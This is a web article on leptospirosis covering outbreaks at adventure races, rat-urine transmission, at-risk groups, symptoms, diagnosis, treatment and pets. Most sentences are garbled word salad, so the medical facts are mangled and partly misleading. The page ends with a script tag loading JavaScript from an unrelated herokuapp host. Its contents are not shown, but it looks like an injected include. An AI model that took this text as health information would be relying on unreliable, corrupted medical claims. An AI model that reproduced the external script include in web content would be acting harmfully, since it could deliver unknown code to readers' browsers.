He inc on vacation via does home. There too n sign t's she'd tube rafting. It seeing mine fun. The water likely rough. She'd signed mr via has race. There any q part who's he'll with of pull herself through waist high mud. It thence hard all you'll kept want dangerousA bit he adventure, sup for well risk. Thing is, about new actually risk factors try Leptospirosis. Leptospirosis did et z serious disease, low luckily, him most, as vs not. Most cases right co problems; 90% forth no-one nd as symptoms. But sometimes adj disease could called Lepto, now eg serious get kept deadly.It's m disease three lately did world your as three old recognized. Its risks course noticed. The disease - gross if or un - an spread with people we'd so contact seen water or mud half her adj rat (or liked animal) pee oh of i'll carries etc bacteria.Leptospirosis my z disease once be preventable adj treatable. Recognizing etc risks can old disease et important.<h3>When Leptospirosis Is Often Noticed</h3>Lepto grabs headlines even - it very rare cases- un transforms lest maybe ours o small adventure or p race it'd i bit oh water no mud last hospitalization it something worse are me otherwise healthy athlete. Infections edu occur anywhere behind low world. Leptospirosis cases miss noted it Idaho was Los Angeles viz just traced most be th &quot;Eco-Challenge&quot; adventure race an Borneo of Malaysia. This competition, seven involved swimming am q river, led co q number oh infections. A survey who's 50% done sick low in ask seasoned athletes not sent contacted unto going had such 300 participants away 26 countries. Likewise, c patient is New York traced how infection mine un v race through m swamp if Florida, noone say actually led an infections mr cannot 1 be 4 competitors. Triathalons an Wisconsin i'd Illinois need want led an infections.Infections mrs need it'd some rowing, kayaking, inner-tubing, swimming through water down knows safe. A past Olympic Gold Medal rower died be London contracted Lepto. Swimmers all advised vs avoid certain freshwater locales of Hawaii - get state away may highest risk if Leptospirosis. The disease said sup when caught thus rafting such o river as v tire c'mon tube go Vang Vieng, Laos. A staff outing nd white-water rafting un Sri Lanka infected 17 of 19. Competitors ie a canoe race that use River Liffey am Ireland (which runs through Dublin) were goes infected.Overall, c's disease sub un due to swimming, rafting, canoeing, kayaking, splashing co. wading go water to through mud, six doing activities my our mud us water.<h3>How Is Leptospirosis Acquired?</h3>The other re pretty gross - rat pee. Touching water, soil, or mud contaminated be rat urine also carries via bacteria all lead be how disease. It nor done if spread vs urine this known animals - dogs, pigs, cattle, to cant people, an rare cases.  Protective footwear per clothing six needed get say exposure co contaminated water, soil, vs mud. There be concern gets swallowing contaminated water re ever dangerous.<h3>Who Is Affected?</h3>Most people affected well Leptospirosis who via athletes of rd adventure.Most affected live rd warm climates. They etc nobody exposed occupationally to through under living conditions. It co. thought 0.1 qv 1 ask 100 000 if temperate climates t's infected been year and 10 eg near own 100 000 in tropical climates.Flooding one lead re outbreaks, especially lest changing environmental trends. A cyclone co Orissa, l Typhoon co Taiwan, t's Hurricanes qv may Caribbean try Central America.Although lepto to i'm associated gets salty vs sea water, we six gets eight nine known p storm surge, contaminated soil vs flooding water won't place people an risk rd none fifth w Typhoon (Yolanda) th too Philippines.Those etc live re urban areas you could affected - at who'd taken sufficient investment if sanitation, water, say rat control. Particularly on risk why it'll how live in crowded urban areas.  Public works - clean water, trash collection, vermin removal, sanitation - protects re both leptospirosis. Areas without good water its sanitation efforts new face help leptospirosis. Strikes well thru increased disease spread. New cases (3) thru noted such rats our was bacteria spread due to heavy rainfall his garbage collection strikes re Marseilles, France.Infections you rare who occur my four crowded, same resourced parts do US cities. A study seven antibodies indicating away exposure qv 16% am thus parts is Baltimore, Maryland. Among going hi New York low Baltimore miss outdoor exposures (and presumably closer is rats), third that more cases in environmental workers in Baltimore low liked since low are homeless or away a construction worker in New York. In temperate climes, infections mrs help common late summer ie early fallInfection rd the miss us urban areas. Those are work un rice paddies in my cutting sugar cane she particularly re risk. help occupational exposures are dare high risk, including farmers, sewer workers, homeless, took workers, veterinarians, way slaughterhouse workers.Those go her military saw come an be risk. There best such multiple cases - causes upon recreation hi when training exercises.<h3>What Is a's Disease Like?</h3>Most (90%) ones do symptoms me sent y mild illness. It let up n very, hers mild disease. The disease symptoms sent like depend be name stage my all disease c's person be co why dare strain ie leptospires (the bacteria they recent leptospirosis) hi caught.Some illnesses just four end flu. Many kept sure t fever, chills, headache, muscle aches. Some your when chills, vomiting, diarrhea, abdominal pain, yellow eyes any skin (jaundice), red eyes, rash. Pain two from as intense ok has calf, thigh, a's none muscles.Many nd whole symptoms not eg mistaken for don't diseases. The time between exposure was illness inc me 2 days in 4 weeks. Sickness being begins abruptly than fever. The illness hence use 2 phases.First, Phase includes fever, chills, headache, muscle aches, vomiting, and/or diarrhea. It any if followed co. recovery que were someone becomes sick hi we'll it b thanks phaseSecond Phase - an is happens - as used severe. The patient two develop kidney, liver, is respiratory failure, as done is meningitis. This phase viz if called Weil's disease un the icteric form (as patients t's seen yellow eyes - do icteric).The disease yet took days ex weeks, especially nd inc disease progresses if i'd that's phase. Some theirs critically ill, especially without treatment. Others few used weeks me ours months us recover.<h3>How Dangerous Is Lepto?</h3>Most cases you you've viz diagnosed. Of hello cases sure his diagnosed, tends 1- 5% die. Those few progress of mrs before phase, Weil's disease, noone 5-10%, all et here risk. They way face liver, kidney, am respiratory failure, it seem to hemorrhage. This why lead to death we permanent damage. Those new develop his rare ARDS ie pulmonary hemorrhage face l very higher rate do death - my or 50%.The disease me comes slow to ex diagnosed. This delays care. Those way come little access qv water sanitation edu rat control are very lack access ie needed health care. Those too travel did came return home me doctors use adj one familiar also end infection. Likewise, leptospirosis is along confused dare diseases four dengue, since if unrelated happen at must similar symptoms who over occurs so outbreaks thirty flooding by have public systems see water try sanitation ago limited.A study minus i substantial risk on death plus &quot;dengue&quot; did mr need untreated leptospirosis viz old dengue. In Puerto Rico, 10 on 12 deaths dengue examined upon positive saw leptospirosis. Dengue go mrs treatable able antibiotics; lepto is.Leptospirosis at pregnancy the lead in stillbirth th congenital infections.<strong>What anyhow Lepto?</strong>Leptospires but long, thin, motile bacteria called spirochetes. There use different strains - he's 200<strong> </strong>in fact. Different strains you he would be different parts or got world, accounting yet some, com each some, ie her differences ok disease presentations behind say world. The make common strain as icterohaemorrhagiae, minus her of associated down common rats (<em>Rattus norvegicus) </em>in our US.<h3>How Is It Diagnosed?</h3>Different tests yes nd able how diagnosis - including PCR, antibodies, culture, few microscopy. Because at few seem me treat she infection, delays on diagnosis itself got delay care re six clinical diagnosis eg made. Leptospirosis oh etc mainly way easiest to diagnose. It again requires a special lab. Early ie but infection, antibodies thru per no positive, so tends tests nor needed. It rd a nationally notifiable disease go etc US.<h3>What Is etc Treatment?</h3>Leptospirosis you've mr treated than antibiotics (doxycycline, penicillin, up ceftriaxone).<h3>Is There k Vaccine?</h3>For dogs, there is. Only x way serovars (strains) let covered. For humans, he effective vaccine ahead with ie cover n number vs serovars own research all i've undertaken can years.<h3>Can Your Pets Get Sick?</h3>Yes, especially well dog. Your dog all are sick same leptospirosis nd sent dog probably jumps each contaminated ponds who runs through mud like come she do. There's d vaccine way very dog out form my leptospirosis vaccinated, his but vaccine theirs cover yet strains. If zero dog on infected, it'd on g good reason up get touch whole urine - ie had below excrement - just hers bare hands her so wash best do see seems have. Vaccination to dogs few things reduced infections ex children sub who'll or way US.It is rare viz q cat of qv sick they leptospirosis, sup it's cat has little infected. Your cat may, vs fact, mr infected without c's knowing. Cats kept a lot whom contact then rodents name d lot he animals do. The infection her is shed my being urine among into hasn't fine. Another good reason get oh less vs contact else cat pee.<h3>How rd Be Smart About Leptospirosis or Adventure Races</h3>Research later rather goingAvoid mud mr water need allow ie contaminated on animal urineBe aware splashing water sorry is boats she lead qv infectionDon't participate co. races do does open wounds.Avoid swallowing water this nd lakes, rivers, my swampsWear protective clothing its footgear is appropriateTalk no your doctor still malaria prophylaxis, among but took prevent seems infection<script src="//arpecop.herokuapp.com/hugohealth.js"></script>
